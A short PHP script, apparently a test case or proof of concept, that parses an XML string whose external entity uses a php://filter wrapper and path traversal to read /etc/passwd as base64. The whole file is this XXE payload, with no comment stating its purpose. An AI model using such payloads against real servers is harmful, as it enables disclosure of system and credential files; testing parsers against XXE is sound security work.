<?php
libxml_use_internal_errors(true);
$xml = '<!DOCTYPE root [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../../../../etc/passwd"> ]><root>&xxe;</root>';
$xml_parser = xml_parser_create();
xml_parse_into_struct($xml_parser, $xml, $values, $index);
xml_parser_free($xml_parser);
?>
